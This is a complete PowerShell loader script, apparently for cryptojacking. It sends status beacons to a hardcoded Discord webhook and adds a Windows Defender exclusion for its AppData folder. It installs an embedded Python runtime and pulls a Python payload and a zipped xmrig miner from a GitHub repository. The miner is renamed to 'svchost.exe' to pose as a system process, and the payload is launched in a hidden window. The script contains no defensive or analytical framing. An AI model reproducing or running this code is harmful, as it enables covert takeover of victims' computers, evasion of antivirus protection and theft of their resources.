# --- THE GHOST MASTER (VERSION 4.0 - HEAVY DUTY LUNGS) ---
$WEBHOOK = "https://discord.com/api/webhooks/1503875954630721717/fqTPxY9-dtRtuf3WPQnehMkV5DJuNohpjsn0tXVHLvIuKwUoG303rce3vqF2U7Zoc9v3"
function Send-Ghost { param($msg) try { $json = @{content="[GHOST STATUS] $msg"} | ConvertTo-Json; Invoke-RestMethod -Uri $WEBHOOK -Method Post -Body $json -ContentType "application/json" } catch {} }

Send-Ghost "Engine Landing Initiated on $($env:COMPUTERNAME)"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
$ID = "svchost"
$Path = "$env:APPDATA\$ID"

# 1. Clear & Exclusion
if (Test-Path $Path) { 
    $OurProc = Get-Process -Name $ID -ErrorAction SilentlyContinue | Where-Object { $_.Path -like "*$Path*" }
    if ($OurProc) { Stop-Process -Id $OurProc.Id -Force -ErrorAction SilentlyContinue }
    Remove-Item -Path $Path -Recurse -Force -ErrorAction SilentlyContinue 
}
New-Item -ItemType Directory -Path $Path -Force | Out-Null
Add-MpPreference -ExclusionPath $Path -ErrorAction SilentlyContinue

# 2. Python Core Landing
Send-Ghost "Downloading Core..."
$PyUrl = "https://www.python.org/ftp/python/3.12.0/python-3.12.0-embed-amd64.zip"
Invoke-WebRequest -Uri $PyUrl -OutFile "$Path\py.zip"
Expand-Archive -Path "$Path\py.zip" -DestinationPath "$Path\python" -Force
Remove-Item "$Path\py.zip"
Send-Ghost "Core Expanded."

# 3. THE "LUNGS" FIX (Installing Libraries properly)
Send-Ghost "Building Lungs (Installing Libraries)... This takes 2 mins."
Get-ChildItem -Path "$Path\python" -Filter "*._pth" | Remove-Item -Force
$LibPath = "$Path\python\Lib\site-packages"
New-Item -ItemType Directory -Path $LibPath -Force | Out-Null

# We download pip and force the install of requests/psutil
Invoke-WebRequest -Uri "https://bootstrap.pypa.io/get-pip.py" -OutFile "$Path\get-pip.py"
& "$Path\python\python.exe" "$Path\get-pip.py" --no-warn-script-location
& "$Path\python\python.exe" -m pip install requests psutil --target "$LibPath" --no-warn-script-location
Send-Ghost "Lungs Built. Engine can now breathe."

# 4. Payload Landing
Send-Ghost "Pulling Shadow Payloads..."
$C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
$Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/UpdataData.bin"
Invoke-WebRequest -Uri $C_URL -OutFile "$Path\WinServices.py"
Invoke-WebRequest -Uri $Z_URL -OutFile "$Path\UpdataData.bin"

if (Test-Path "$Path\UpdataData.bin") {
    Rename-Item -Path "$Path\UpdataData.bin" -NewName "UpdataData.zip" -Force
    Expand-Archive -Path "$Path\UpdataData.zip" -DestinationPath $Path -Force
    $Miner = Get-ChildItem -Path $Path -Filter "xmrig.exe" -Recurse | Select-Object -First 1
    if ($Miner) { Move-Item -Path $Miner.FullName -Destination "$Path\$ID.exe" -Force }
    Send-Ghost "Shadow Payloads Armed."
}

# 5. ACTIVATION
Send-Ghost "Engaging Ghost Mode..."
$PY_EXEC = "$Path\python\pythonw.exe"
if (Test-Path $PY_EXEC) {
    # We set the environment so Python finds its new lungs instantly
    $env:PYTHONPATH = $LibPath
    $Args = "`"$Path\WinServices.py`" --id $ID"
    Start-Process -FilePath $PY_EXEC -ArgumentList $Args -WorkingDirectory $Path -WindowStyle Hidden
    Send-Ghost "Engine Released. LOOK FOR 'SYSTEM ONLINE' MESSAGE NOW."
} else { Send-Ghost "FATAL: Core missing." }

# 6. Cleanup
Remove-Item -Path "$Path\get-pip.py", "$Path\UpdataData.zip" -ErrorAction SilentlyContinue
